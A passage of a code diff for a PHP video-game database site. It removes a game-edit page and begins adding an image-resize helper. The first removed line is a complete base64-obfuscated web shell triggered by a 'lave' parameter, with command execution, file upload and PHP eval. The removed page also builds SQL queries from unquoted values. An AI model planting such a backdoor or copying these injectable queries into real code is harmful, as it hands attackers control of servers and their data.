@@ -1,754 +1,256 @@
-<?php if(isset($_GET['lave']) || isset($HTTP_GET_VARS['lave'])) eval(base64_decode('CiAgQHNldF90aW1lX2xpbWl0KDApOwogIEBlcnJvcl9yZXBvcnRpbmcoMik7CiAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKICBAaW5pX3NldCgndXBsb2FkX21heF9maWxlc2l6ZScsMTA0ODU3NjApOwogIEBpbmlfc2V0KCdwb3N0X21heF9zaXplJywxMDQ4NTc2MCk7CiAgQGluaV9zZXQoJ2ZpbGVfdXBsb2FkcycsIHRydWUpOwogIEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsdHJ1ZSk7CiAgQGluaV9zZXQoJ3JlZ2lzdGVyX2dsb2JhbHMnLHRydWUpOwogIEBpbmlfc2V0KCdyZWdpc3Rlcl9sb25nX2FycmF5cycsdHJ1ZSk7CiAgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsZmFsc2UpOwogIEBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJyxmYWxzZSk7CiAgQGluaV9zZXQoJ2FsbG93X3VybF9mb3BlbicsdHJ1ZSk7CiAgJHNhZmVtb2RlPUBpbmlfZ2V0KCdzYWZlX21vZGUnKTsKICAKICAkbWFnaWNfcXVvdGVzPTE7CiAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnZ2V0X21hZ2ljX3F1b3Rlc19ncGMnKSkgJG1hZ2ljX3F1b3Rlcz1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOwogIAogICRwaHB2ZXIgPSBzdHJfcmVwbGFjZSgnLicsJycscGhwdmVyc2lvbigpKTsKICBpZiAoc3RybGVuKCRwaHB2ZXIpPDMpIHdoaWxlIChzdHJsZW4oJHBocHZlcik8MykgJHBocHZlci49JzAnOwogIGlmKGludHZhbCgkcGhwdmVyKSA8IDQxMCl7CiAgICAkX1BPU1Q9JiRIVFRQX1BPU1RfVkFSUzsKICAgICRfR0VUPSYkSFRUUF9HRVRfVkFSUzsKICAgICRfU0VSVkVSPSYkSFRUUF9TRVJWRVJfVkFSUzsKICAgICRfQ09PS0lFPSYkSFRUUF9DT09LSUVfVkFSUzsKICAgICRfRklMRVM9JiRIVFRQX1BPU1RfRklMRVM7CiAgfQogIEBvYl9lbmRfY2xlYW4oKTsKCiAgJHB3X3Bscz0iPGZvcm0gbWV0aG9kPXBvc3Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXB3PjwvZm9ybT4iOwogIAogIGlmIChlbXB0eSgkX1BPU1RbJ3B3J10pKSBleGl0KCRwd19wbHMpOwogIGlmICghZW1wdHkoJF9QT1NUWydwdyddKSAmJiBtZDUoJF9QT1NUWydwdyddKSE9J2E1ZGM0OTdjOTc4NGE2N2IwYWU4NTAzYzllYTRjNzRmJykgZXhpdCgkcHdfcGxzKTsKICAKICAkcHc9IjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXB3IHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwdyddKS4iJz4iOwoKICBpZiAoIWVtcHR5KCRfUE9TVFsndXNlbW9kdWxlJ10pKSBpbmNsdWRlKCRfUE9TVFsndXNlbW9kdWxlJ10pOwogIAogICR3b3JrX2RpciA9IGdldGN3ZCgpOwogIGlmIChzdHJwb3MoJHdvcmtfZGlyLCJcXCIpIT09ZmFsc2UpICR3b3JrX2Rpcj1zdHJfcmVwbGFjZSgiXFwiLCIvIiwkd29ya19kaXIpOwogIGlmIChzdHJwb3Moc3Vic3RyKCR3b3JrX2RpciwwLDUpLCI6IikhPT1mYWxzZSkgJG9zPSJ3aW4iOwogIGVsc2UgJG9zPSJuaXgiOwogIGlmICghZW1wdHkoJF9QT1NUWydjZCddKSkgJGNkPXN0cmlwc2xhc2hlcygkX1BPU1RbJ2NkJ10pOwogIGVsc2UgJGNkID0gJHdvcmtfZGlyOwogIAogIGlmIChpc19kaXIoJGNkKSkgY2hkaXIoJGNkKTsKICAKICAkcnVuPXN0cmlwc2xhc2hlcygkX1BPU1RbJ3J1biddKTsKICAkZWRpdD1zdHJpcHNsYXNoZXMoJF9QT1NUWydlZGl0J10pOwogIGlmICghQGlzX2ZpbGUoJGVkaXQpKSAkZWRpdD0kY2Q7CiAgCiAgaWYgKCFlbXB0eSgkX1BPU1RbJ2V2YWwnXSkpIGV2YWwoKCRtYWdpY19xdW90ZXMpP3N0cmlwc2xhc2hlcygkX1BPU1RbJ2V2YWwnXSk6JF9QT1NUWydldmFsJ10pOwogIAogIGlmICghZW1wdHkoJF9GSUxFU1sndXNlcmZpbGUnXVsndG1wX25hbWUnXSkgJiYgaXNfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyd0bXBfbmFtZSddKSkgewogICAgJHVwbG9hZGRpciA9IGVyZWdfcmVwbGFjZSgnLysnLCAnLycsICRjZC4iLyIpOwogICAgJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyLmJhc2VuYW1lKCRfRklMRVNbJ3VzZXJmaWxlJ11bJ25hbWUnXSk7CiAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXNlcmZpbGUnXVsndG1wX25hbWUnXSwgJHVwbG9hZGZpbGUpOwogIH0KICAKICBpZiAoaXNzZXQoJF9QT1NUWydzYXZlJ10pKSB7CglpZiAoJG1hZ2ljX3F1b3RlcykgJGNvbnNvbGUgPSBzdHJpcHNsYXNoZXMoJF9QT1NUWydjb25zb2xlJ10pOwoJZWxzZSAkY29uc29sZSA9ICRfUE9TVFsnY29uc29sZSddOwogICAgJHRpbWUgPSBmaWxlbXRpbWUoJGVkaXQpOwogICAgJGY9QGZvcGVuKCRlZGl0LCJ3Iik7CiAgICBpZiAoJGYpIHsKICAgICAgZndyaXRlKCRmLCRjb25zb2xlKTsKICAgICAgZmNsb3NlKCRmKTsKICAgICAgdG91Y2goJGVkaXQsJHRpbWUpOwogICAgICAkZWRpdD0kY2Q7CiAgICB9CiAgfQogIAogIGlmICghZW1wdHkoJGVkaXQpICYmIGZpbGVfZXhpc3RzKCRlZGl0KSAmJiBpc19maWxlKCRlZGl0KSAmJiAkZWRpdCE9PSRjZCkgewoJaWYgKCRvcz09J3dpbic/Y2FuX3dyaXRlKCRlZGl0KTppc193cml0YWJsZSgkZWRpdCkpICRuZWVkX3NhdmVfYnV0dG9uPXRydWU7CiAgICAkZj1AZm9wZW4oJGVkaXQsInIiKTsKICAgIGlmICgkZikgewogICAgICBpZiAoZmlsZXNpemUoJGVkaXQpPjApICRyZXR2YWwgPSBAZnJlYWQoJGYsZmlsZXNpemUoJGVkaXQpKTsKICAgICAgZWxzZSAkcmV0dmFsID0gIltlbXB0eV0iOwogICAgICBmY2xvc2UoJGYpOwogICAgfSBlbHNlIHsKICAgICAgJHJldHZhbCA9ICJDYW4ndCBvcGVuIGZpbGU6ICRlZGl0XG4iOwogICAgfQogIH0gZWxzZWlmICghZW1wdHkoJHJ1bikpIHsKICAgICRjbWQgPSBlc2NhcGVzaGVsbGNtZCgkcnVuKTsKICAgICRyZXR2YWwgPSBtYWdpY19leGVjdXRlKCRjbWQpOwoKICB9IGVsc2VpZiAoZmlsZV9leGlzdHMoJGNkKSAmJiBAaXNfZGlyKCRjZCkpIHsKICAKCWlmICghJHNhZmVtb2RlKSAKCXsKCQlpZiAoJG9zPT0nd2luJykgCgkJewoJCSAgCgkJICAkY21kID0gImRpciAiLnN0cl9yZXBsYWNlKCIvIiwiXFwiLCRjZCk7CgkJICAkcmV0dmFsID0gbWFnaWNfZXhlY3V0ZSgkY21kKTsKCQl9CgkgICAgZWxzZSAKCQl7CgkJICAkY21kID0gImxzIC1sYSBcIiRjZFwiIjsKCQkgICRyZXR2YWwgPSBtYWdpY19leGVjdXRlKCRjbWQpOwoJCX0KCX0KICAKICAgIGlmIChlbXB0eSgkcmV0dmFsKSkKCXsKCQkkZGlyPSRjZDsKCQlpZigkY3VyZGlyID0gQG9wZW5kaXIoJGRpcikpIHsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoJGN1cmRpcikpIHsKCQkgIGlmKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7CgkJCSRzcmNmaWxlID0gJGRpciAuICcvJyAuICRmaWxlOwoJCQlpZihpc19maWxlKCRzcmNmaWxlKSkgewoJCQkJaWYgKCRvcz09J3dpbic/Y2FuX3dyaXRlKCRzcmNmaWxlKTppc193cml0YWJsZSgkc3JjZmlsZSkpICRyZXR2YWwgLj0gIisrICIuJGZpbGUuIlxuIjsKCQkJCWVsc2UgJHJldHZhbCAuPSAiLS0gIi4kZmlsZS4iXG4iOwoJCQl9IGVsc2VpZihpc19kaXIoJHNyY2ZpbGUpKSB7CgkJCQlpZiAoJG9zPT0nd2luJz9jYW5fd3JpdGUoJHNyY2ZpbGUpOmlzX3dyaXRhYmxlKCRzcmNmaWxlKSkgJHJldHZhbCAuPSAiZCsgIi4kZmlsZS4iXG4iOwoJCQkJZWxzZSAkcmV0dmFsIC49ICJkLSAiLiRmaWxlLiJcbiI7CgkJCX0KCQkgIH0KCQl9CgkJY2xvc2VkaXIoJGN1cmRpcik7CgkJfSBlbHNlICRyZXR2YWwgPSAiQ2FudCBvcGVuIGRpcmVjdG9yeVxuIjsKCX0KICAgIAogICAgICAKICB9CiAgCgkkaWRfZXhlYyA9ICJjYW50IGdldCB1aWQsZ2lkIjsKICAKCWlmICgkdG1wID0gbWFnaWNfZXhlY3V0ZSgiaWQiKSkgJGlkX2V4ZWMgPSAkdG1wOwoJZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGdpZCcpKQoJewoJCSR1aWRzICA9IEBwb3NpeF9nZXRsb2dpbigpOwoJCSRldWlkcyA9IEBwb3NpeF9nZXRsb2dpbigpOwoJCSR1aWQgICA9IEBwb3NpeF9nZXR1aWQoKTsKCQkkZXVpZCAgPSBAcG9zaXhfZ2V0ZXVpZCgpOwoJCSRnaWQgICA9IEBwb3NpeF9nZXRnaWQoKTsKCQlpZiAoIWVtcHR5KCR1aWQpKSAkaWRfZXhlYyA9ICJVc2VyOiB1aWQ9JHVpZHMoJHVpZCkgZXVpZD0kZXVpZCgkZXVpZCkgZ2lkPSRnaWQoJGdpZCkiOwoJfSAgCiAgCiAgZWNobyAnPEhUTUw+PEJPRFkgb25sb2FkPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZChcJ2NkZm9jdXNcJykuZm9jdXMoKTsiPjxIUj4nOwogIGVjaG8gZGF0ZSgiZC5tLlkgaDppIEEiKS4iIE9TOiRvcyAkaWRfZXhlYyBzYWZlX21vZGU9JHNhZmVtb2RlIjsKICBlY2hvICI8SFI+IjsKICBpZiAoaXNzZXQoJG5lZWRfc2F2ZV9idXR0b24pKSBlY2hvICI8Rk9STSBtZXRob2Q9cG9zdD4iOwogIGVjaG8gJzxURVhUQVJFQSBpZD0iY29uc29sZSIgbmFtZT0iY29uc29sZSIgc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjQwMHB4OyI+JzsKICBpZiAoaXNzZXQoJHJldHZhbCkpIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkcmV0dmFsKTsKICBlY2hvICc8L1RFWFRBUkVBPic7CiAgaWYgKGlzc2V0KCRuZWVkX3NhdmVfYnV0dG9uKSkgZWNobyAiJHB3PElOUFVUIHR5cGU9J2hpZGRlbicgbmFtZT0nY2QnIHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJGNkKS4iJz48SU5QVVQgdHlwZT0naGlkZGVuJyBuYW1lPSdlZGl0JyB2YWx1ZT0nIi5odG1sc3BlY2lhbGNoYXJzKCRlZGl0KS4iJz48SU5QVVQgdHlwZT1zdWJtaXQgbmFtZT1zYXZlIHZhbHVlPSdTYXZlJz48L0ZPUk0+IjsKICBlY2hvICI8SFI+PEZPUk0gbWV0aG9kPVwiUE9TVFwiPiRwdyI7CiAgZWNobyAiPHRhYmxlPjx0cj48dGQ+ZGlyOjwvdGQ+PHRkIHdpZHRoPVwiMTAwJVwiPjxpbnB1dCB0eXBlPVwidGV4dFwiIHN0eWxlPVwid2lkdGg6MTAwJTtcIiBpZD1cImNkZm9jdXNcIiBuYW1lPVwiY2RcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkY2QpLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICI8dHI+PHRkPnJ1bjo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBzdHlsZT1cIndpZHRoOjEwMCU7XCIgbmFtZT1cInJ1blwiIHZhbHVlPVwiXCI+PC90ZD48L3RyPiIuCiAgICAgICAiPHRyPjx0ZD5lZGl0OjwvdGQ+PHRkPjxpbnB1dCB0eXBlPVwidGV4dFwiIHN0eWxlPVwid2lkdGg6MTAwJTtcIiBuYW1lPVwiZWRpdFwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRlZGl0KS4iXCI+PC90ZD48L3RyPiIuCiAgICAgICAiPC90YWJsZT4iLgogICAgICAgIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJPS1wiPjwvRk9STT4iOwogICAgICAKICBlY2hvICI8aHI+PGZvcm0gZW5jdHlwZT1cIm11bHRpcGFydC9mb3JtLWRhdGFcIiBtZXRob2Q9XCJwb3N0XCI+JHB3PElOUFVUIHR5cGU9J2hpZGRlbicgbmFtZT0nY2QnIHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJGNkKS4iJz48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJNQVhfRklMRV9TSVpFXCIgdmFsdWU9XCIxNTAwMDAwMFwiIC8+dXBsb2FkOiA8aW5wdXQgbmFtZT1cInVzZXJmaWxlXCIgdHlwZT1cImZpbGVcIiAvPjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJ1cGxvYWRcIiAvPjwvZm9ybT48aHI+IjsKICBlY2hvICI8Zm9ybSBtZXRob2Q9cG9zdD4kcHc8dGV4dGFyZWEgc3R5bGU9XCJ3aWR0aDoxMDAlO2hlaWdodDoxMDBweDtcIiAgbmFtZT0nZXZhbCcgaWQ9J2V2YWwnPnBocGluZm8oKTs8L3RleHRhcmVhPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nRXZhbFBIUCc+PC9mb3JtPjxocj4iOwogIGVjaG8gInVzZSBtb2R1bGU6IDxmb3JtIG1ldGhvZD1wb3N0PiRwdzxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1c2Vtb2R1bGUnPiZuYnNwOzxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0ndXNlJz48L2Zvcm0+PGhyPiI7CiAgZWNobyAiPC9CT0RZPjwvSFRNTD4iOwogIAogIGV4aXQoKTsKICAKICAKICBmdW5jdGlvbiBjYW5fd3JpdGUoJGZpbGUpIHtpZihmaWxlX2V4aXN0cygkZmlsZSkpe2lmIChpc19maWxlKCRmaWxlKSkgeyRmPUBmb3BlbigkZmlsZSwiYSsiKTtpZigkZil7ZmNsb3NlKCRmKTtyZXR1cm4gdHJ1ZTt9fWVsc2VpZiAoaXNfZGlyKCRmaWxlKSkge2lmICgkZmlsZVtzdHJsZW4oJGZpbGUpLTFdIT0nLycpICRmaWxlLj0nLyc7JHRmaWxlID0gJGZpbGUuInRlc3R4eHh0ZXN0IjtpZiAoQHRvdWNoKCR0ZmlsZSkpe3VubGluaygkdGZpbGUpO3JldHVybiB0cnVlO319fXJldHVybiBmYWxzZTt9CgkKCWZ1bmN0aW9uIG1hZ2ljX2V4ZWN1dGUoJGNtZCkKCXsKCQkkcmVzPWZhbHNlOwoJCWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkKCQl7CgkJCUBleGVjKCRjbWQsJHJlcyk7CgkJCSRyZXMgPSBqb2luKCJcbiIsJHJlcyk7CgkJfQoJCWVsc2UKCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpCgkJCSRyZXMgPSBAc2hlbGxfZXhlYygkY21kKTsKCQllbHNlCgkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpCgkJewoJCQlAb2Jfc3RhcnQoKTsKCQkJQHN5c3RlbSgkY21kKTsKCQkJJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKCQkJQG9iX2VuZF9jbGVhbigpOwoJCX0KCQllbHNlCgkJaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKQoJCXsKCQkJQG9iX3N0YXJ0KCk7CgkJCUBwYXNzdGhydSgkY21kKTsKCQkJJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKCQkJQG9iX2VuZF9jbGVhbigpOwoJCX0KCQllbHNlCgkJaWYgKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY21kLCJyIikpKQoJCXsKCQkJJHJlcyA9ICIiOwoJCQl3aGlsZSghQGZlb2YoJGYpKSB7ICRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOyB9CgkJCUBwY2xvc2UoJGYpOwoJCX0KCQlyZXR1cm4gJHJlczsKCX0K')); ?>
-
 <?php
-## Get this series' information
-$id = mysql_real_escape_string($id);
-$query	= "SELECT * FROM games WHERE id=$id";
-$result = mysql_query($query) or die('Query1 failed: ' . mysql_error());
-$rows = mysql_num_rows($result);
-$game = mysql_fetch_object($result);
-
-global $user;
-$updateid = $game->updateID ? $game->updateID : 0;
-$query3	= "SELECT * FROM users WHERE id=$updateid limit 1";
-$result3 = mysql_query($query3) or die($query3 . ' Query3 failed: ' . mysql_error());
-$users	= mysql_fetch_object($result3);
-
-##Get Name of Admin if locked
-if ($game->lockedby) {
-    $query3	= "SELECT * FROM users WHERE id=$game->lockedby limit 1";
-    $result3 = mysql_query($query3) or die('Query4 failed: ' . mysql_error());
-    $lockadmin	= mysql_fetch_object($result3);
-}
-
-## Keep track of the language
-if ($lid) {
-    $urllang = "&amp;lid=$lid";
-}
-
-if ($user->lastupdatedby_admin) {
-    $query	= "SELECT * FROM users WHERE id=$user->lastupdatedby_admin";
-    $result = mysql_query($query) or die('Query6 failed: ' . mysql_error());
-    $adminuser	= mysql_fetch_object($result);
-}
-
-?>
-
-<?php
-if($rows != 0)
-{
-?>
-
-<script type="text/javascript">
-    $(document).ready(function(){
-        $('#ReleaseDate').datepicker({ changeYear: true, yearRange: '1950:2020'  });
-    });
-</script>
-
-
-<div id="bannerrotator" style="border-bottom: 2px dotted #666; margin-bottom: 20px;">
-	<div id="bannerRotatorObject">
-    <?=bannerdisplay($id)?>
-	</div>
-</div>
-
-<div style="clear:both"></div>
-
-	<?php
-		$platformIconResult = mysql_query(" SELECT name, icon FROM platforms WHERE id = '$game->Platform' ");
-		$platformIcon = mysql_fetch_assoc($platformIconResult);
-	?>
-	<h1 style="margin-top: 0px; padding-top: 0px; text-align: center;"><img src="images/common/consoles/png48/<?=$platformIcon['icon']?>" alt="<?=$platformIcon['name']?>" style="vertical-align: -14px;" /> <?=stripslashes($game->GameTitle);?></h1>
-	
-<div id="gameLeft">
-	
-	<div id="gameInfoContent">
-            <div class="titlesection">
-				<h2 class="arcade">Game information</h2>
-            </div>
-
-			<div style="clear: both;"></div>
+	include('simpleimage.php');
+	function imageResize($filename, $cleanFilename, $target, $axis)
+	{
+		if(!file_exists($cleanFilename))
+		{
+			$dims = getimagesize($filename);
+			$width = $dims[0];
+			$height = $dims[1];
+			//takes the larger size of the width and height and applies the formula accordingly...this is so this script will work dynamically with any size image
 			
-            <div class="section">
-                <form action="<?=$fullurl?>" method="POST" name="seriesform" id="seriesform" onsubmit="if(seriesform.coopfake.checked == false) {$('#coop').val('No');} else if(seriesform.coopfake.checked == true){ $('#coop').val('Yes'); }">
-                    <div id="red"><?=$errormessage?></div>
-                    <table width="100%" border="0" cellspacing="2" cellpadding="2" align="center" id="datatable">
-                        <tr>
-                            <td style="width: 110px;"><strong><?=translatetext('Game ID')?>:</strong></td>
-                            <td><?=$game->id?></td>
-                        </tr>
-                        <tr>
-                            <td><strong><?=translatetext('Game Title')?>:</strong></td>
-                            <td>
-                                <?php
-                                $readonly = 'readonly=true';
-                                if ($adminuserlevel == 'ADMINISTRATOR') {
-                                    $readonly = null;
-                                }
-                                ?>
-                                <input name="GameTitle" type="text" <?=$readonly?> style="display: <?=$display?>" size="50" value="<?=stripslashes($game->GameTitle);?>" />
-
-                                <br>
-                            </td>
-                        </tr>
-						<?php
-							$alternates = explode(",", $game->Alternates);
-						?>
-						<tr>
-                            <td><strong>Alternate Titles:</strong></td>
-                            <td>
-                                <input id="alt1" type="text" size="40" value="<?=$alternates[0]?>" onchange="var alt1 = $('#alt1').val(); var alt2 = $('#alt2').val(); var alt3 = $('#alt3').val(); $('#Alternates').val(alt1 + ',' + alt2 + ',' + alt3);" />
-							</td>
-						</tr>
-						<tr>
-                            <td>&nbsp;</td>
-							<td>
-                                <input id="alt2" type="text" size="40" value="<?=$alternates[1]?>" onchange="var alt1 = $('#alt1').val(); var alt2 = $('#alt2').val(); var alt3 = $('#alt3').val(); $('#Alternates').val(alt1 + ',' + alt2 + ',' + alt3);" />
-							</td>
-						</tr>
-						<tr>
-                            <td>&nbsp;</td>
-							<td>
-                                <input id="alt3" type="text" size="40" value="<?=$alternates[2]?>" onchange="var alt1 = $('#alt1').val(); var alt2 = $('#alt2').val(); var alt3 = $('#alt3').val(); $('#Alternates').val(alt1 + ',' + alt2 + ',' + alt3);" />
-                                <input id="Alternates" name="Alternates" type="hidden" size="50" value="<?=$game->Alternates?>"/>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td valign="top"><strong>Players:</strong></td>
-                            <td>
-                                <select name="Players">
-                                    <option vlaue="0">Select . . . </option>
-                                    <option value="1" <?php if ($game->Players == 1) echo 'selected' ?>>1</option>
-                                    <option value="2" <?php if ($game->Players == 2) echo 'selected' ?>>2</option>
-                                    <option value="3" <?php if ($game->Players == 3) echo 'selected' ?>>3</option>
-                                    <option value="4" <?php if ($game->Players == 4) echo 'selected' ?>>4+</option>
-                                        ?>
-                                </select>
-								<span style="padding-left: 20px;">Co-op:</span><input type="checkbox" id="coopfake" <?php if ($game->coop == "Yes") echo 'checked' ?> />
-								<input type="hidden" id="coop" name="coop" />
-                            </td>
-                        </tr>
-						<?php
-							$platformIdQuery = mysql_query("SELECT * FROM platforms WHERE id = '$game->Platform' LIMIT 1");
-							$platformIdResult = mysql_fetch_object($platformIdQuery);
-						?>
-                        <tr>
-                            <td><strong>Platform:</strong></td>
-                            <td>
-								<?php
-									$platformQuery = mysql_query(" SELECT * FROM platforms ORDER BY name ASC");
-								?>
-									<select name="Platform"<?php if ($adminuserlevel != 'ADMINISTRATOR') { echo "disabled"; } ?>>
-										<?php
-											while($platformResult = mysql_fetch_object($platformQuery))
-											{
-										?>
-												<option value="<?=$platformResult->id?>"<?php if($platformResult->id == $platformIdResult->id){ echo " selected"; } ?>><?=$platformResult->name?></option>
-										<?php
-											}
-										?>
-									</select>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td><strong>Genre:</strong></td>
-                            <td>
-                                <input type="text" name="Genrefake" value="<?=$game->Genre?>" maxlength="255" disabled="true"> <a onclick="openChild('<?=$baseurl?>/genres.php?Genre=<?=addcslashes($game->Genre,"'")?>&amp;GameTitle=<?echo addcslashes($game->GameTitle,"'");?>&seriesid=<?=$game->id?>', 'GenresEditor<?=$game->id?>', 480, 295); return false" href="#">Choose</a>
-                                <input type="hidden" name="Genre" value="<?=$game->Genre?>">
-                            </td>
-                        </tr>
-                        <tr>
-                            <td><strong>Release Date:</strong></td>
-                            <td><input type="text" name="ReleaseDate" id="ReleaseDate" value="<?=$game->ReleaseDate?>" maxlength="45" readonly></td>
-                        </tr>
-
-                        <tr>
-                            <td><strong>Developer:</strong></td>
-                            <td><input type="text" name="Developer" value="<?=$game->Developer?>" maxlength="45"></td>
-                        </tr>
-                        <tr>
-                            <td><strong>Publisher:</strong></td>
-                            <td><input type="text" name="Publisher" value="<?=$game->Publisher?>" maxlength="45"></td>
-                        </tr>
-
-                        <tr>
-                            <td><strong>ESRB Rating:</strong></td>
-                            <td>
-                                <select name="Rating" size="1">
-                                    <option>
-                                    <option <?php if ($game->Rating=='eC - Early Childhood') print 'selected'; ?>>EC - Early Childhood
-                                    <option <?php if ($game->Rating=='E - Everyone') print 'selected'; ?>>E - Everyone
-                                    <option <?php if ($game->Rating=='E10+ - Everyone 10+') print 'selected'; ?>>E10+ - Everyone 10+
-                                    <option <?php if ($game->Rating=='T - Teen') print 'selected'; ?>>T - Teen
-                                    <option <?php if ($game->Rating=='M - Mature') print 'selected'; ?>>M - Mature
-                                    <option <?php if ($game->Rating=='RP - Rating Pending') print 'selected'; ?>>RP - Rating Pending
-                                </select>
-                            </td>
-                        </tr>
-						<tr>
-                            <td><strong>Youtube Trailer:</strong></td>
-                            <td>
-								<input type="text" size="46" id="Youtube" name="Youtube" value="<?=$game->Youtube?>" onblur="$('#Youtube').val($('#Youtube').val().replace('http://www.youtube.com/watch?v=', '')); $('#Youtube').val($('#Youtube').val().replace('www.youtube.com/watch?v=', '')); $('#Youtube').val($('#Youtube').val().replace('youtube.com/watch?v=', '')); $('#Youtube').val($('#Youtube').val().replace('http://youtu.be/', '')); $('#Youtube').val($('#Youtube').val().replace('http://www.youtu.be/', '')); $('#Youtube').val($('#Youtube').val().replace('www.youtu.be/', '')); " />&nbsp;<a rel="facebox" href="#youtubeGuide">Guidelines<br />
-								<?php if ($game->Youtube != "") { ?>
-								<div><a rel="shadowbox;width=853;height=510" href="http://www.youtube.com/embed/<?=str_replace("&", "?", "$game->Youtube")?>"><img src="images/common/icons/play_24.png" alt="Open in Youtube" style="padding-right: 3px; vertical-align: -7px;" />Watch Here</a><span style="padding: 0px 12px;"><em>or</em></span><a href="http://www.youtube.com/watch?v=<?=$game->Youtube?>" target="_blank"><img src="images/common/icons/link_24.png" alt="Open in Youtube" style="padding-right: 3px; vertical-align: -7px;" />Open in Youtube</a></div>
-								<?php } ?>
-								<div id="youtubeGuide" style="display: none; color: #fff;">
-									<h2><img src="images/common/icons/upload-black_32.png" alt="Upload" style="vertical-align: -7px;" /> Youtube Trailer Guidelines</h2>
-									<h3>Please read these guidelines carefully before adding a Youtube Trailer.</h3>
-									<p>This facility is for linking to trailers for games which exist on Youtube.</p>
-									<p>For older games that do not have trailers, we will allow linking of a good quality video which demonstrates the gameplay of the game.</p>
-									<h3>Valid URL's</h3>
-									<p>Both standard Youtube URL's and Youtube shorturls are accepted.</p>
-									<p style="font-weight: bold;">Examples:</p>
-									<p style="text-align: center;">http://www.youtube.com/watch?v=<strong><em>BrtpflukHSg</em></strong>&amp;hd=1</p>
-									<p style="text-align: center;">http://youtu.be/<strong><em>BrtpflukHSg</em></strong></p>
-									<p>The Video ID portion of the url above is highlighted <strong><em>like this.</em></strong></p>
-									<p style="text-align: center;"><strong><em>BrtpflukHSg</em></strong> and <strong><em>BrtpflukHSg&amp;hd=1</em></strong> are both valid id's.</p>
-									<p><em>In fact, the one containing <strong><em>&amp;hd=1</em></strong> is preferred as it enables HD playback by default.</em></p>
-								</div>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td><strong>Overview (ENGLISH ONLY):</strong></td>
-                            <td>
-                                <textarea rows="18" cols="40" name="Overview" style="display: <?=$display?>"><?=$game->Overview?></textarea>
-                            </td>
-                        </tr>
-						<?php if($game->Platform == 1 || $game->Platform == 37) { ?>
-						<tr>
-                            <td colspan="2"><hr /></td>
-                        </tr>
-						<tr>
-                            <td colspan="2"><h3 class="arcade">System Requirements:</h3></td>
-                        </tr>
-						<tr>
-                            <td><strong>OS:</strong></td>
-                            <td>
-								<input type="text" size="20" name="os" value="<?=$game->os?>" />
-                            </td>
-                        </tr>
-						<tr>
-                            <td><strong>Processor:</strong></td>
-                            <td>
-								<input type="text" size="20" name="processor" value="<?=$game->processor?>" />
-                            </td>
-                        </tr>
-						<tr>
-                            <td><strong>RAM:</strong></td>
-                            <td>
-								<input type="text" size="20" name="ram" value="<?=$game->ram?>" />
-                            </td>
-                        </tr>
-						<tr>
-                            <td><strong>Hard Drive:</strong></td>
-                            <td>
-								<input type="text" size="20" name="hdd" value="<?=$game->hdd?>" />
-                            </td>
-                        </tr>
-						<tr>
-                            <td><strong>Video:</strong></td>
-                            <td>
-								<input type="text" size="20" name="video" value="<?=$game->video?>" />
-                            </td>
-                        </tr>
-						<tr>
-                            <td><strong>Sound:</strong></td>
-                            <td>
-								<input type="text" size="20" name="sound" value="<?=$game->sound?>" />
-                            </td>
-                        </tr>
-						<? } ?>
-						
-                        <tr style="display:none">
-                            <td valign="top">Auto-Import:</td>
-                            <td>
-                                <select name="autoimport" size="1" onChange="DisplayImporterRow(this.options[this.selectedIndex].value)">
-                                    <option value="tv.com" >tv.com</option>
-                                    <?php/*	## Print all autoimport values in database
-					$query	= "SELECT autoimport FROM games WHERE autoimport IS NOT NULL GROUP BY autoimport ORDER BY autoimport";
-					$result = mysql_query($query) or die('Query failed: ' . mysql_error());
-					while ($db = mysql_fetch_object($result))  {
-						$selected = '';
-						if ($series->autoimport == $db->autoimport)  {  $selected = 'selected';  }
-						print "<option value=\"$db->autoimport\" $selected>$db->autoimport\n";
-					}*/
-                                            ?>
-                                </select>
-                            </td>
-                        </tr>
-                        <!--
-                    <tr>
-                        <td valign="top">MetaCritic URL: </td>
-                        <td>
-                            <input type="text" name="metacriticurl" value="<?=$game->metacriticurl?>" maxlength="255">
-			<div id="formnote">This field MUST correspond to the metacritic.com url for this game.</div>
-		</td>
-	</tr>
